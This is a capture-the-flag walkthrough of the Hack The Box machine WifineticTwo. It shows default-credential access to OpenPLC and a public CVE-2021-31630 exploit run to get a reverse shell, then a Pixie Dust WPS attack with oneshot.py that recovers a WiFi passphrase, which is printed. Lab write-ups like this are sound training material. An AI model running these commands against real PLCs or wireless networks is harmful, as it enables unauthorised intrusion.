---
layout: writeup
title: "WifineticTwo"
date: 2026-06-16
description: "Walkthrough of HTB WifineticTwo, a Medium Linux machine."
tags: [Box, medium, linux]
---

## Reconnaissance

The assessment began with a full Nmap scan to identify open ports and running services.

```bash
nmap 10.10.11.7 -Pn -sC -sV -A -p- -T4 -oA scan
```

The scan shows SSH and HTTP exposed. The **-sC** option also surfaces a web-based login panel.

![The scan reveals that SSH and HTTP services are exposed](/assets/images/wifinetic-two/72-1.png)
*The scan reveals that SSH and HTTP services are exposed*

## Enumeration / Analysis

Default credentials work, logging in with **openplc:openplc**. Inside the application is a feature for uploading programs, restricted to files with the **.st** extension.

A search for known vulnerabilities affecting this software turns up **CVE-2021-31630**, which allows authenticated remote code execution.

The public exploit script is run, supplying the IP address, listening port, and valid credentials.

```python
python exploit.py -ip <YOUR IP> -p <YOUR PORT> -u <USERNAME> -pwd <PASSWORD>
```

This results in a successful reverse shell on the target system.

![This results in a successful reverse shell on the target system](/assets/images/wifinetic-two/72-2.png)
*This results in a successful reverse shell on the target system*

## Exploitation

Once inside, commands already run as the root user, yet the expected root flag is not present on this machine.

![Once inside the system, confirming that running commands as the root user](/assets/images/wifinetic-two/72-3.png)
*Once inside the system, confirming that running commands as the root user*

This suggests a pivot to another network segment may be required. Checking the network configuration with **ifconfig** reveals an additional interface.

![This suggests that pivoting to another network segment may be required](/assets/images/wifinetic-two/72-4.png)
*This suggests that pivoting to another network segment may be required*

Since **nmap** is not installed, the **arp** command is used to enumerate hosts on the newly discovered network.

![Enumerating neighboring hosts with arp](/assets/images/wifinetic-two/72-5.png)
*Enumerating neighboring hosts with arp*

![Hosts discovered on the second network segment](/assets/images/wifinetic-two/72-6.png)
*Hosts discovered on the second network segment*

This confirms that lateral movement is possible. Inspecting the filesystem surfaces configuration files under **/etc** related to WPA wireless networking.

![This confirms that lateral movement is possible](/assets/images/wifinetic-two/72-7.png)
*This confirms that lateral movement is possible*

## Wireless Pivoting

The wireless interface is scanned with **iwlist** to identify nearby access points.

```bash
iwlist wlan0 scan
```

![Scanning the wireless interface using iwlist to identify nearby access points](/assets/images/wifinetic-two/72-8.png)
*Scanning the wireless interface using iwlist to identify nearby access points*

The identified wireless network uses a security protocol that is vulnerable to **Pixie Dust** attacks, which can allow recovery of the WiFi passphrase.

![Wireless network vulnerable to a Pixie Dust attack](/assets/images/wifinetic-two/72-9.png)
*Wireless network vulnerable to a Pixie Dust attack*

This type of attack enables extraction of the wireless key. The **oneshot.py** script is transferred to the compromised machine and the required parameters are prepared.

![This type of attack enables extraction of the wireless key](/assets/images/wifinetic-two/72-10.png)
*This type of attack enables extraction of the wireless key*

![This type of attack enables extraction of the wireless key](/assets/images/wifinetic-two/72-11.png)
*This type of attack enables extraction of the wireless key*

The script is run against the target access point.

```python
python3 oneshot.py -b 02:00:00:00:01:00 -i wlan0 -K
```

The attack succeeds, revealing the wireless network password.

![The attack succeeds, revealing the wireless network password](/assets/images/wifinetic-two/72-12.png)
*The attack succeeds, revealing the wireless network password*

## Privilege Escalation

The system provides several utilities for managing both network connections and system services. Using the recovered WiFi credentials, the connection is configured with **wpa_supplicant**, following documented guidelines.

```bash
wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf
```

![The system provides several utilities for managing both network connections and system services](/assets/images/wifinetic-two/72-13.png)
*The system provides several utilities for managing both network connections and system services*

![The system provides several utilities for managing both network connections and system services](/assets/images/wifinetic-two/72-14.png)
*The system provides several utilities for managing both network connections and system services*

![The system provides several utilities for managing both network connections and system services](/assets/images/wifinetic-two/72-15.png)
*The system provides several utilities for managing both network connections and system services*

An additional **systemd** configuration file is created to ensure the interface is managed correctly.

![Creating an additional systemd configuration file to ensure the interface is properly managed](/assets/images/wifinetic-two/72-16.png)
*Creating an additional systemd configuration file to ensure the interface is properly managed*

After bringing the interface up, an IP address is assigned to it.

```bash
sudo ifconfig wlan0 192.168.1.7 netmask 255.255.255.0 up
```

Using **ip a** verifies connectivity and helps identify other hosts on the network.

![Verifying connectivity and listing other hosts with ip a](/assets/images/wifinetic-two/72-17.png)
*Verifying connectivity and listing other hosts with ip a*

An **arp -a** scan reveals a gateway device. Connecting to this host over SSH locates the **root** flag, completing the machine.

![An arp -a scan reveals a gateway device](/assets/images/wifinetic-two/72-18.png)
*An arp -a scan reveals a gateway device*
